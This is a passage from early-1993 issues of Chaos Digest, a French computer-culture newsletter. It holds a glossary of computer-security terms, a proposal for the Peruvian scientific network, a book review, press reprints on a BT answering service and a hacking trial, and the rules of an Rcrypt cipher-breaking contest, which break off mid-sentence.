    free games in an arcade.  Some military systems are rumored to have
    back doors in their software that prevents their being used against
    the countries that built them.


blivet (attack) - A denial-of-service attack performed by hogging
    limited resources that have no access controls (for example, shared
    spool space on a multi-user system). [Classically defined as "ten pounds
    of horsesh*t in a five pound bag"]


browsing - Gaining unauthorized read-only access to files.


C2 Catch-22  - Refers to the paradox that all federal computers are
    required to be certified to the C2 level of Trust (or better) by 1992
    (especially if they are to be permitted access to a network), yet
    because no C2 certification has ever been performed with the network
    software active, NSA will revoke the certification of any system as
    soon as it is connected to a network.  [Also "C2-by-'92 Catch-22".]


cascading - To gain additional privileges on a host (or within a
    process) by using those privileges legitimately (if perhaps unwisely)
    granted to casual users.


crayola books - A disparaging reference to the "rainbow books",
    commonly used when referring to the upcoming rewrite of NSA's
    technical computer security guidelines.


crypt (attack) - Stealing the system password file and looking for
    known encrypted passwords.


data diddling - To alter another's data (especially, to do so subtly
    so it will not be detected); a major breach of the hacker ethic.


denial-of-service attack - Any method which an intruder might use to injure
   authorized users of a system by making its facilities unavailable.  Often
   easier to accomplish than hijacking a privileged account.


dictionary (attack) - Trying a dictionary of commonly used or vendor
    installed passwords.


Easter Egg - This is a usually benign feature added to a product by
    the programmer without official knowledge or consent.  One example of
    the is the 'xyzzy' command in Data General's AOS operating system.
    Another is the "RESIST THE DRAFT" message in an unused sector of Apple
    Logo.


ethical hacker - Someone who espouses the view that he/she may
    "ethically" penetrate any computer or network so long as no data is
    altered.  [Colloquially among computer security professionals: a dead
    hacker (or one who has ceased hacking).]


leapfrog (attack) - Using userid and password information obtained
    illicitly from one host (e.g., downloading a file of account IDs and
    passwords, tapping TELNET, etc.) to compromise another host.  Also, to
    TELNET through one or more hosts in order to confuse a trace (standard
    cracker procedure).


masquerading - To assume the identity of another user to gain
    unauthorized access to a host or network.


mockingbird - Software that intercepts communications (especially
    logon processes) between users and hosts and provides system-like
    responses to the users while obtaining information (especially account
    IDs and passwords).


pest - A set of instructions that self-replicates uncontrollably,
    eventually rendering a network or system unusable via a
    blivet attack. [sometimes called "wabbits"]


phage - An autonomous program that inserts malicious code into
    other autonomous programs (e.g., a computer worm or probe
    that carries a virus or trojan horse program).


polymorphic virus - 1. A virus using variable encryption with a
    variable decryption routine to avoid detection by its
    "signature".  V2P6, Whale, Maltese, Amoeba, Russian Mutant
    and PC-Flu 2 are examples. 2. Any virus that changes it's
    behaviour such as infect different types of host or change
    their mode of operation.  A virus that infects both .COM and
    .EXE programs as well as boot sectors can be considered
    polymorphic.


probe - A non-self-replicating, autonomous program (or set of
    programs) that has the ability to execute indirectly
    through a network or multi-partition computer system
    (e.g., various hacker utilities).


rainbow books - NSA's technical computer security guidelines.
    So named because each of the books is published with a
    different color cover.  [See "crayola books".]


scavenging - To exploit unerased residual data.  The controversy with
    the Prodigy [users finding pieces of the their data in the
    STAGE.DAT file] service is an alleged example of this.


spoofing - An attack which relies on the inability of users or computer
    systems to verify the identity or location of a communication partner.
    A `mockingbird' spoofs the computer's login sequence to fool a user;
    some cracking software repeatedly spoofs human login actions to fool
    the computer.


stealth virus - A type of virus that attempts to hide its existence.
    A common way of doing this on IBM PCs is for the virus to hook
    itself into the BIOS or DOS and trap sector reads and writes that
    might reveal its existence.


trapdoor - A method of bypassing a sequence of instructions, often
    some part of the security code (e.g. the computer logon).


time bomb - This is code or a program that checks the systems clock in
    order to trigger its active symptoms.  The popular legend of the time
    bomb is the programmer that installs one in his employer's computers
    to go off in case he is laid off or fired.


trojan (horse) - This is some (usually nasty) code that is added to,
    or in place of, a harmless program.  This could include many viruses
    but is usually reserved to describe code that does not replicate
    itself.


unknown system-state (attack) - To exploit the conditions that occur
    after a partial or total system crash (e.g., some files remain open
    without an end-of-file condition allowing an intruder to obtain
    unauthorized access to other files by reading beyond the real EOF when
    service is resumed).


virus - a piece of code that is executed as part of another program
    and can replicate itself in other programs.  The analogy to real
    viruses is pertinent ("a core of nucleic acid, having the ability to
    reproduce only inside a living cell").  Most viruses on PCs really are
    viruses.


worm - An autonomous program (or set of programs) that can replicate
    itself, usually over a network.  A worm is a complete program by
    itself unlike a virus which is either part of another program or
    requires another program's thread of execution to operate.  Robert
    Morris's program, the Internet Worm, is an example of a worm although
    it has been mistakenly identified in the popular media as a virus.

________________________________________________________________________

 _____
|     | Johnathan Vail     vail@tegra.com     (508) 663-7435
|Tegra| jv@n1dxg.ampr.org    N1DXG@448.625-(WorldNet)
 -----  MEMBER: League for Programming Freedom (league@prep.ai.mit.edu)

------------------------------

End of Chaos Digest #1.09
************************************

Chaos Digest             Lundi 22 Fevrier 1993        Volume 1 : Numero 10

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.10 (22 Fev 1993)
File 1--Reseau de Donnees Scientifique Peruvien: RCP
File 2--Denning's _Computers Under Attack_ (critique)
File 3--Repondeur Telephonique sur Ligne Occupee (reprints)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from jbcondat@attmail.com. The editors may be
contacted by voice (+33 1 47874083), fax (+33 1 47877070) or S-mail at:
Jean-Bernard Condat, Chaos Computer Club France [CCCF], 47 rue des Rosiers,
93400 St-Ouen, France

Issues of Chaos-D can also be found on some French BBS. Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * ftp.eff.org (192.88.144.4) in /pub/cud
        * red.css.itd.umich.edu (141.211.182.91) in /cud
        * halcyon.com (192.135.191.2) in /pub/mirror/cud
        * ftp.ee.mu.oz.au (128.250.77.2) in /pub/text/CuD
        * nic.funet.fi (128.214.6.100) in /pub/doc/cud

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Wed Feb 17 11:43:24 EST 1993
From: js@rcp.pe (Jose Soriano )
Subject: File 1--Reseau de Donnees Scientifique Peruvien: RCP


Bonjour,

     Je vous envoye le projet sur lequel nous sommes en train de
travailler.  En ce moment, nous installons notre "link" internationale
avec satellite de 64 kbps dans Panamsat. Aussi, nous sommes en
negociations avec la CEE pour etablir une connexion dediee vers
l'Europe.


=======================================================================
                     RED CIENTIFICA PERUANA
                  (Peruvian Scientific Network)
=======================================================================

INTRODUCTION

     The market entry of minicomputers, adjusted to the needs and sizes
of the smallest research team, as well as the more recent spectacular
development of microcomputers have changed traditionally used research
work modes.

     The abundance of ever quicker perishable information sources and
the increasing cost of the means to access them have evidenced the need
for interinstitutional cooperation and for the rationalization of
increasingly scarce resources, both in the national and international
environment.

     Peruvian entities devoted to research and teaching, as well as
state and private universities, non governmental organizations, industry,
finance and commercial corporations are carrying on internal installation
of communication networks (LANS), sharing the use of these resources for
the purpose of more efficient results.

     The above described development, begun some years ago, is still on
the run.  The need to exploit expensive means (telecomunications with
major research centers, access to international databases, access to
focused resources) and the national and international reach of mutual
scientific and technological cooperation among teams of researchers
made the interconnection of these networks a must in both the national
and international scope.  To achieve this, by late 1991 many national
organizations contributed to the establishment of RED CIENTIFICA PERUANA
(Peruvian Scientific Network).

     Previous documents have described the history of this cooperative
national network and the services it renders its users.  We will now
deal with its present technical structure and its growth plans for the
current two year period.



           DESCRIPTION OF THE PERUVIAN SCIENTIFIC NETWORK


Organization
------------

     RCP is a low cost national network that has achieved high
operational quality in short time, and so far links 132 institutions all
over the country.  The main services it provides, described in further
detail are the following: electronic mail, access to distributed national
listservers, software installation, technician and user training.

     It is organized as a non profit institution, and its body of members
includes one representative from each participant organization. The staff,
the Direction Committee and an Administrator are entitled by a General
Assembly, the highest authority in the association.

     Under the coordination of the General Administrator reporting to the
Direction Committee, a small staff including engineersand trainees are in
charge of technical operation, node installation, administrator and user
training, as well as of permanent support to final users.

     The Technical Committee, formed by representatives from member
organizations, is the consulting entity in charge of the national network
planning and development, as well as of the coordination of institutional
developments related to the national network's prospective architecture.


Financial resources
-------------------

     As an autonomous cooperative institution, RCP counts on funds
provided by the its institutions in yearly contributions and monthly
payments, all of which sum up to form its operational budget.  RCP also
aims at being granted donors' contributions and other kinds of physical
of financial collaboration from national and international cooperation
agencies.


Infrastructure
--------------

     RCP is a dialup active node in the INTERNET organization, that
uses the store and forward system of NOVELL networks, Tokenring, DOS
PCs, VAX, SUN, DEC and other systems integrated in the national network,
running on UNIX operative system.

     Its development is supported by the existing (or currently being
installed) national telecommunications infrastructure, both public and
private national and international telephone lines (CPT and ENTEL);
national x25 network (Perunet); special circuits or dedicated lines (CPT
and ENTEL); optic fiber network (RED DIGITAL ENTEL);cellular telephone
networks (CPT and Celular 2000).  It is also supported by the transponder
in PANAMSAT I, belonging to the Ministry of Education as well as
different international carriers rendering service in Peru.

     The main concentration node of the national network is accessed via
two lines within the commuted telephone line (RTC 19,200 kbps), a space
circuit x25 (Perunet 9,600 kbps) allowing for the simultaneous access of
16 users, a Netblazer router allowing for the (TCP/IP) network access
through a special circuit (dedicated line) or through a commuted
telephone line (RTC).

     International communications are held several times per day through
international calls (IDD) generated by the m2xenix machine located in
Oregon, United States, where they enter the international backbone of
the National Science Foundation.



                     THE NATIONAL NETWORK (RCP)


General Information on the Project
----------------------------------

     The organization and distribution of activities within the
national system and the scientific and technological cooperation call
for the constant exchange of information on the national, regional and
international scopes.

     Electronic mail has allowed our researchers to get information
which not long ago was inaccessible by other means.  It has also
contributed to the establishment of interinstitutional cooperation and
coordination links which were until now beyond imagination.

     The current installation of referential data banks distributed all
over the network, accessible via electronic mail (listservers), the
establishment of thematic subnets (the health and the epidemiologic
alert networks), the operation of more than 20 interest groups
susbscribed in similar international lists all this generates a constant
increase in the dataflow through the country and also internationally.

     The new needs lead us to the simultaneous development of a network
architecture to allow for means of communication in different scopes:
national (IP links), regional (IP links with our neighbors, especially
Andean ones, and through them with the rest of LAC) and international
(IP dedicated link with NSF).


National Architecture
---------------------

     The dynamic development of this infrastructure is projected in two
non-exclusive stages, the development of which can be partially or
completely simultaneous.

     The first stage is currently being developed in the location of
Lima, Peruvian's capital city, which gathers the majority of educational
and research institutions.  It projects the interconnection of 10
concentrator nodes (by locations and / or interest areas), linked by
special circuits (64 or more kbit/s dedicated lines in the digital cable).
First preliminary tests projected for 1992-1993.

     The second stage prioritizes the development of departmental nodes
that geographically concentrate the traffic and allow for a reduction in
the telecommunications costs of province located institutions.  The
establishment of special circuits is also aimed at with the main RCP node,
located in Lima (x25 dedicated lines:  19,200 kbps, 64 kbit/s optic
fiber; or others: 9,200 kbps).  First preliminary tests projected for
1993-1994.

     RCP, based on its various national components, will enable the
interactive access of final users to the resources available in the
several institutions that form the network.  Linkage of the same (IP) in
the local networks existing in each campus will imply an efficient
structure that will allow for their future evolution.

     Provincial nodes located in the country borders can ensure low cost
link with neighbor countries, thus opening ways to enhance regional
cooperation and the exploitment of mutually shared resources.  First
preliminary tests projected for 1993-1994.

     The above mentioned link will clearly allow for an improvement of
research related communications and for a real development of regional
science and technology.  It thus represents the communications means that
will be decisive in future industry, finance and trade.

     This national and regional development is necessarily supported by
the establishment of a high quality linkage with the NSF international
backbone in the United States.  For this purpose, we intend to establish
two 64 Kbit satellite channels, supported by the contract between Peru's
Ministry of Education and Alpha Lyracom, which provides PAS I and PAS II
(Panamsat) with a transponder.  This does not exclude the possibility of
using international carriers (Sprint and MCI, available in the local
market).

     All the described development is a part of the original RCP project,
elaborated in May, 1991 and later on improved through consecutive
proposals and documents published by RCP along 1991 and 1992.


Necessary Equipment for Project Implementation
----------------------------------------------

     In order to implement the project in all its stages, the purchase
of equipment and the acquisition of national and international
telecommunications infrastructure is a must. This refers to both RCP
infrastructure and the concentrator nodes of national scope.

     In most cases, RCP member institutions are financially able to
afford these needs on their own.  For other cases, cooperative solutions
will be found, based on interinstitutional collaboration aiming at the
purchase of necessary equipment.  In most cases, RCP's task focuses on
searching the best international prices for all the network member
institutions, on the reception and entry of the equipment; but also
consists essentially in providing orientation as for equipment
characteristics, aiming at a better individual and common use of it.



                        GENERAL OBJECTIVES


1.  To provide the Peruvian academic community with better services in
    national communications, such as a better link with the
    international backbone of academic networks;

2.  To develop a coherent national INTERNET network;

3.  To increase inter-institutional cooperation in the national,
    regional and international scope;

4.  To reduce the national research system's communication costs, and to
    allow for a future reduction of regional costs over the basis of
    cooperation;

5.  To start an IP regional backbone that links Peru, Ecuador, Colombia,
    Bolivia, Chile; and, through the latter, Argentina, Uruguay and
    Brazil.


                          SPECIFIC OBJECTIVES

1.  To provide RCP, the Peruvian National Network, with equipment
    for the installation and implementation of a national IP network and
    an international link;

2.  To provide RCP, the Peruvian National Network, and the regional
    networks with the equipment necessary to install and implement links
    with neighbor countries' networks;

3.  To provide RCP, the Peruvian National Network, with the resources
    necessary to establish a lasting IP link with the international
    backbone (one cost time, or for a reasonable period of time);

4.  To train human resources on the national and regional levels for
    using new equipments and technologies.  National and regional level
    training and divulgation of new technologies.


Jose Soriano
Peruvian Scientific Network Administrator
--
un abrazo
Jose
***********************************************************************
Jose Soriano   - Red Cientifica Peruana - e-mail : js@rcp.pe
Av. del Ejercito 1870 - San Isidro - Lima - Peru
TE: ( 51 -14) 46 - 16 -95 / 36 89 89 anexo 527 / fax:  36 01 40
-----------------------------------------------------------------------

------------------------------

Date: Fri Feb 19 14:33:00 -0600 1993
From: roberts@decus.arc.ab.ca ("Rob Slade, DECrypt Editor, VARUG NLC... )
Subject: File 2--Denning's _Computers Under Attack_ (critique)
Copyright: Robert M. Slade, 1993


          _Computers Under Attack: intruders, worms and viruses_
                         Peter J. Denning, ed.

ACM Press (11 W. 42nd St., 3rd Floor, New York, NY 10036, 212-869-7440)
                          ISBN 0-201-53067-8

This book is a very readable, enjoyable and valuable resource for anyone
interested in "the computer world".

That said, I must admit that I am still not sure what the central theme of
this book is.  Denning has brought together a collection of very high
quality essays from experts in various fields, and at one point refers to
it as a "forum".  That it is, and with a very distinguished panel of
speakers, but it is difficult to pin down the topic of the forum.  Not all
of the fields are in data security, nor even closely related to it.  (Some
of the works, early in the book, relating to what we now generally term
"the Internet", do contain background useful in understanding later works
regarding "cracking" intrusions and worm programs.)

All, however, are interesting and sometimes seminal works.  Some are
classics, such as Ken Thompson's "Reflections on Trusting Trust" and Shoch
and Hupp's "The Worm Programs".  Others are less well known but just as
good, such as the excellent computer virus primer by Spafford, Heaphy and
Ferbrache.

(Please do not consider my confusion over the subject to be a criticism,
either.  I do want to recommend the book.  I just find myself wondering to
whom to recommend it.  Also, in fairness, I must say that Peter Denning,
who has had a chance to respond to the first draft of this review as
usual, doesn't consider it a review.  Which, I suppose, makes us even  :-)

The book is divided into six sections.  The first two deal with networks
and network intrusions, the next two with worms and viral programs, and
the last two with cultural, ethical and legal issues.  While all of the
topics have connections to data security, there are some significant
"absences".  (There is, for example, no discussion of the protection of
data against "operational" damage, as in accidental deletions and failure
to lock records under multiple access.)

In addition to shortages of certain fields of study within data security,
the treatment of individual topics shows imbalances as well.  The division
on worm programs contains seven essays.  Six of these deal with the
Internet/Morris worm.  The seventh is the unquestionably important Shoch
and Hupp work, but it is odd that there is so much material on the
Internet/Morris worm and nothing on, say, the CHRISTMA EXEC.

Sad to say, the essays are not all of equal calibre.  This is only to be
expected: not all technical experts have equal facility with langauge.
However, in spite of the noted gaps, and the occasional "bumps" in the
articles, most of the articles can be read by the "intelligent innocent"
as well as the "power user".  At the same time, there is much here that
can be of use to the data security expert.  At the very least, the book
raises a number of ongoing issues that are, as yet, unresolved.

What, then, is the book?  It is not a data security manual: the technical
details are not sufficient to be of direct help to someone who is
responsible for securing a system.  At the same time, a number of the
essays raise points which would undoubtedly lead the average system
administrator to consider security loopholes which could otherwise go
unnoticed.

Is it a textbook?  While it would be a valuable resource for any data
security course, the "missing" topics make it unsuitable as the sole
reference for a course.  The breadth of scope, and the quality of the
compositions make it very appealing, as does the inclusion of the large
social component.

While the book won't have the popular appeal of a "Cuckoo's Egg", it is
nevertheless a "good read" even for the non-technical reader.  The
section on international networks is particularly appropriate as society
is becoming more interested in both email and "cyberspace".  The overview
it gives on related issues would benefit a great many writers who seem to
have a lot of "profile" but little understanding.

My initial reason for reviewing the book was primarily as a resource for
those seeking an understanding of computer viral programs.  As such,
there are definite shortcomings in the coverage, although what is there
is of very high quality.  The additional topics, far from detracting
from the viral field or clouding the issue, contribute to a fuller
understanding of the place of viral programs in the scheme of computers
and technology as a whole.  Therefore, while it would be difficult to
recommend this work as a "how to" for keeping a company (or home) safe
from viral programs, it should be required reading for anyone seriously
interested in studying the field.

One point is raised by the inclusion of the cultural, social and legal
essays within the book.  It was with a trepidation growing almost to a
sense of despair that I read the last two sections.  Here we see again
the same hackneyed phrases, and the same unmodified positions that have
been a part of every discussion of computer ethics for the last twenty
years.  (Or more.)  This is by no means to be held against Denning: on
the contrary, it is the fact that he has selected from the best in the
business that is so disheartening.  Do we really have no more options
than are listed here?  Can we really come to no better conclusions?

One illustration that is repeatedly used is that of credit reporting
agencies.  We feel that such entities must be watched.  We note that
the computer systems which they depend upon must be checked for
anomalies, such as bad data or "key fields" which cross link bad data
with good people.  Still and all, we see them as a necessary evil.
Breaking into such systems, however, is an invasion of privacy, and
therefore wrong.  Carried to its logical conclusion, this attitude
states that "free" access to such semi-private information is wrong,
but that it is "right" for companies to make money by "selling" such
information.

Of course the situation is not quite that simple.  (It never is, is it?)
After all, a large corporation needs the goodwill of the public for its
continued existence.  The corporation, therefore, has more of a vested
interest in safeguarding confidential information than any random
individual with a PC and a modem.  This belief in the "enlightened self
interest" of corporations, however, would seem to more properly belong
to an earlier age: one in which corporations didn't go bankrupt and
banks didn't fall like dominos.  After all, it used to be that
companies kept employees on for forty years before giving them the gold
watch.  Now even the most stable might lay off forty thousand in one
year.

A single thread runs through almost all sixteen articles, four
statements and ten letters in the final two sections.  It is a call,
sometimes clarion, sometimes despairing, for "computer ethics".  Not
once is there proposed what such an animal might be.  Even the NSF
(National Science Foundation) and CPSR (Computer Professionals for
Social Responsibility) statements only hint at some legalistic
definitions, but never try to look at what a foundation for such
"ethics" might be.  With our society discarding moral bases as fast as
possible, the most useful statement might be Dorothy Denning's, when,
in conversation with Frank Drake, she states that, "The survival of
humanity is going to demand a much greater level of caring for our
fellow human beings ... than we have demonstrated so far."

Still even the disappointments of this final part of the book are
important.  "Computers Under Attack" is a realistic overview of the
current state of thinking in information technology, and the problems
facing society as a whole.  Far from the "gee whiz" of the futurist, and
equally distanced from the sometimes dangerous "CH3CK 1T 0UT, D00DZ!" of
the cyberpunk, Denning's collection of essays is important not only for
the concerned computer user, but also for anyone concerned with the
future of our increasingly technically driven society.


==============                      ______________________
Vancouver      ROBERTS@decus.ca    |    |     /\     |    | swiped
Institute for  Robert_Slade@sfu.ca |    | __ |  | __ |    | from
Research into  rslade@cue.bc.ca    |    | \ \    / / |    | Mike
User           p1@CyberStore.ca    |    | /________\ |    | Church
Security       Canada V7K 2G6      |____|_____][_____|____| @sfu.ca


------------------------------

Date: Fri Feb 19 08:56:55 EST 1993
From: robin@utafll.uta.edu (Robin Cover )
Subject: File 3--Repondeur Telephonique sur Ligne Occupee (reprints)
Copyright: BT Plc , 1989 (pour le 1er), Whk Eng'g Corp., 1993 (le 2e)

[Moderateur: Page 22 d' _Industries et Techniques_ no. 735 du 5 courant,
une breve donne le texte suivant: "En Angleterre, Orpington a concu un
repondeur qui prend des appels meme quand la ligne est occupee. Le
CallMinder se branche sur le reseau telephonique sans equipement
particulier (New Scientist 02/01)". Aucune trace d' "Orpington" sur l'
annuaire electronique anglais, 3619 code GB1.]


Stealing:  A March on Thieves
Swift, Peter
British Telecom World  PP: 44-45  Sep 1989 ISSN: 0953-8429


ABSTRACT: Auto Tracer, a new automobile security system, was developed by a
UK  businessman,  Bernard  Hunt.  The  system allows an automobile owner to
reclaim  a  stolen car by dialing a secret paging number. This turns on the
car's  hazard  lights  and headlights, starts a siren, replaces the license
plate  with  a  message  reading  "stolen  car,"  and  stops  the engine by
eliminating  the  flow of gasoline. Telecom Security offers home protection
with  a  system  that  has  covered door sensors to detect forced entry, an
infrared  motion  detector,  a  smoke  sensor, an internal siren, a control
keypad,  and  a  master control panel. An external dummy bell box acts as a
visual  deterrent  to  criminals.  Callminder,  from  Commtel, offers total
control over all outgoing telephone calls except emergency, free-phone, and
operator fault notification calls.

GEOGRAPHIC NAMES: UK
DESCRIPTORS: Security systems; Automobiles; Homes; Crime; Fire alarm
   systems; Detection alarms

+++++++

UK: TELECOM WATCH - NEW TELEPHONE ANSWERING SERVICE - CALLMINDER
Electronic Times (ELTIM) - January 14, 1993  Page: 8
By: Peta Firth


Several months ago I was selected by BT to try out an intelligent network
service before it went on sale. I was invited to apply to be connected
free to test a proposed new service called Callminder.

   The invitation was couched in "while stocks last" and "first come first
served" terms so I sent off the form not really expecting to hear much
about it again. After all it seemed like a good offer. Callminder, a
telephone answering system based at the local exchange, was something
useful for nothing: always an attractive proposition, I thought.

   But I was selected, and soon received the literature on how to use it
along with a personal identity code to access messages.

   On the morning the service was set to begin I rushed excitedly to the
office to try it out. I called my home number but nothing happened. There
was no answer. Disappointed, I called the enquiry number supplied by BT.
But instead of an explanation I was given a "hotline" number to dial. This
turned out to be hotter than expected: it was the British Gas emergency
number. I called the first number again to check the hotline number was
correct. After explaining that I doubted British Gas would be able to help
I was politely put through to someone else in BT.

   The second BT person said: "Ah yes, You are ahead of us, you know." He
suggested it might begin later that afternoon.

   It did, so I recorded my message to replace the computer generated one
and cheerfully thought to myself: at last, I have an answering machine.

   But over the course of the next few weeks my opinion of the service
slipped. For a start it kept breaking down. I would only find out when
callers told me I must have been imagining I had an answering service
because there was no answer when they tried to ring me. I explained to BT
that if an answering machine was not working when I thought it was, it was
causing more confusion than if I never had one in the first place. After
this complaint BT agreed to at least tell me when the system had been out
of action.

   When the system is working, which to be fair is most of the time, it
still puts callers off. Even people who have overcome their dislike of
answering machines are put off by the interruption after my recorded
message of a brisk computer generated voice in school mistress tones
demanding the caller's name and message.

   The final straw came when I discovered the service did not work in the
small hours of the morning. BT suggested I might like to buy an answering
machine to cover the period. This, of course, would make Callminder
pointless.

   The reason I am telling you all of this is that the DTI issued a
consultative document about intelligent networks just before Christmas.
The document calls for comments from ptos, switch and computer
manufacturers, service providers and users on how to liberalise
intelligent network services. The plan is to take "exclusive control of
the service away from the switch manufacturer" by creating a "generic
software platform" which can be produced and implemented by an vendor.

   This could turn the fortunes of switch manufacturers on their head. It
could destroy any hopes they may have had that pouring money into software
development will maintain their market share. A host of tiny software
houses will be able to undercut the giant switch manufacturers who are
busy expanding their hardware expertise into software.

   If my experience with Callminder is anything to go by, that would be a
great shame. because for me it turned out that if I want reliability I
have to turn to an answering machine: dedicated hardware.

------------------------------

End of Chaos Digest #1.10
************************************

Chaos Digest           Mercredi 24 Fevrier 1993       Volume 1 : Numero 11

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.11 (24 Fev 1993)
File 1--Des adolescents anglais transformes en hackers (reprint)
File 2--Concours sur l'algorithme d'encryptage "Rcrypt"
File 3--Le Pirate est-il un techno-delinquant? (avis)
File 4--CFP: Ninth Annual Computer Security Applications Conf
File 5--Re: 1er "Intl. Computer Virus Writing Contest" (lettre)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from jbcondat@attmail.com. The editors may be
contacted by voice (+33 1 47874083), fax (+33 1 47877070) or S-mail at:
Jean-Bernard Condat, Chaos Computer Club France [CCCF], 47 rue des Rosiers,
93400 St-Ouen, France

Issues of Chaos-D can also be found on some French BBS. Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * ftp.eff.org (192.88.144.4) in /pub/cud
        * red.css.itd.umich.edu (141.211.182.91) in /cud
        * halcyon.com (192.135.191.2) in /pub/mirror/cud
        * ftp.ee.mu.oz.au (128.250.77.2) in /pub/text/CuD
        * nic.funet.fi (128.214.6.100) in /pub/doc/cud

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue Feb 23 11:22:37 GMT 1993
From: jp-sorlat@altern.com (jp-sorlat )
Subject: File 1--Des adolescents anglais transformes en hackers (reprint)
Copyright: Daily Telegraph, 1993


Teenage computer hacker 'caused worlwide chaos'
By Colin Randall


     A SCHOOLBOY used a BBC Micro computer to hack into data systems at
EC offices in Luxembourg and universities around the world, causing
nuisance "on a phnomenal scale", a court heard yesterday.

     With a basic #200 computer commonly found in schools, Paul Bedworth
began hacking at 14 and quickly became obsessed, Mr James Richardson,
prosecuting, said at Southwark Crown Court, south London.

     He allegedly became so proficient that ha was able to change secret
passwords to prevent users gaining access to their own programs.

     To other hackers, with whom Bedworth developed "electronic friendship",
he was "Olicana", the Roman name for his home town of Ilkley, West Yorks,
and adopted by him as a code-name, the court heard.

     "He could get into any system and caused chaos on a vast scale," said
Mr Richardson. "He was tapping into offices at the EC in Luxembourg and
even the experts were worried.  He caused havoc at universities all round
the world so that the computer systems were inacessible to anyone but him.

     "All the time he was runing up huge bills and wiping out systems all
over the world.  He did it for kicks."

     Bedworth, now 20 and studying artificial intelligence at Edinburgh
University, appeared in court with Karl Strickland, 22, and Neil Woods, 26.

     Mr Richardson said there was no suggestion that they were selling
information or involved in fraud but they caused chaos "on a scale that
could not be imagined".  He said police raided the homes of Bedworth,
Strickland and Woods and found evidence of hacking "on a massive scale
involving hundreds of people and organisations".

     Strickland, unemployed, of Chilswall Road, Liverpool, and Woods,
unemployed, of Broadway, Chadderton, Oldham, admitted conspiracy to
dishonestly obtaining telecommunication services and plotting in the
unauthorised publication of material under the Telecommunications Act
1984.

     Woods admitted a further charge of causing criminal damage to a
computer at the Central London Polytechnic.  He and Strickland will be
sentenced later.

     Bedworth, of North Parade, Ilkley, denies three charges of plotting
with Strickland, Woods and others in the unauthorised modification of
computer information.

     He is further charged with conspiring to secure unauthorised access
to computer information and with conspiring to obtain telegraphic services
unlawfully in contravention of the Computer Misuse Act 1990.

     The trial was adjourned until today.

------------------------------

Date: Tue, 16 Feb 1993 04:26:48 GMT
From: butzerd@blanc.eng.ohio-state.edu (Dane C. Butzer )
Subject: File 2--Concours sur l'algorithme d'encryptage "Rcrypt"
Repost from: alt.security


Rcrypt Challenge - Part I: The Flame-Fest

This purpose of this challenge is to see if our new encryption scheme
is as good as we think it is.  To this end, we are offering USD$500 to
the first person that can break it.  Thas challenge will run
approximately 3 months (until 15-May-1993).  We will supply all kinds
of information to anyone wishing to participate :)  The exact rules
follow.

1) First, here's what we are supplying:

   a) The majority of the plain text file that we have encrypted
      (7001 bytes).
   b) 11 encryptions of that file using the SAME KEY.  The first 10 of
      these are the result of a hashed/padded encryption, and the last
      is the result of a pseudo one time pad.  Rcrypt performs both of
      these, based on the same PRNG.
   c) A working executable copy of Rcrypt for use with Sun Sparc-
      Stations, with a license that expires 3 months after the
      challenge ends (15-August-1993).
   d) A listing of the source code to Rcrypt, minus the node locked
      licensing software.  Note that the node locked licensing
      software has NOTHING to do with the encryption method.  It's
      just our method of foiling lazy software pirates once we get
      things into production :>
   e) A manual page describing how to use Rcrypt.  This will be
      provided both in plain text format, and in the proper format for
      inclusion in the man files under SunOS 4.x.
   f) A GENERAL description of the PRNG and the encryption algorithms.
   g) Some statistics about the operation of rcrypt (speed, key size,
      etc.)

2) Second, here's how you can get everything mentioned above:

      All items are available via snail (US mail).  Please send your
      request to:

                          The Rcrypt Challenge
                          7110 Sawmill Village Dr.
                          Columbus, OH  43235

      Please include a self addressed return enveloped.  Also complete
      and include the form that appears at the end of these rules.
      Please make sure that you fill in the HOSTID space.  If you do
      not include the hostid, we will not be able to supply the
      executable.

      Items a,b,c,e,f, and g will be on an Sun formatted 3 1/2 inch
      diskette.  If you supply a 1/4" QIC150 tape ($3.00 return
      postage, please), we will gladly use that instead.  Other
      arrangements may be possible.  Item d will be on 8 1/2" x 11"
      paper.

      Note that we are using snail so that we can not accidentally
      violate any of the export laws that may (or may not :) apply.
      Therefore, we will only maal materials to non-PO box US
      addresses.  We reserve the right to refuse mailing materials to
      anyone at our discretion.

      Items a,b,e,f, and g will be available via e-mail.  Note that
      this does not include either the source code or the executable.
      Therefore, we will be willing to e-mail this material anywhere
      on the internet.  Note that if demand becomes to great (OK, I'm
      being optimistic), we reserve the right to discontinue this
      e-mail servace.

      Finally, we will post items a,b,e,f, and/or g if there is
      sufficent demand.

3) Third, here's what you have to do to get the USD$500 fee:

      Simply be the first person to identify the missing portion of
      the plain text file.  This portion occurs at the end.  The
      overall plain text consists of the Preamble of the Constitution
      of the United States and the first ten amendments to the
      Constitution of the United States, followed by 1000 lines
      consisting simply of the numbers from 1 to 1000 in ascii text,
      followed by a number of blank characters and/or lines, followed
      by a single paragraph of text from a commonly available (as in a
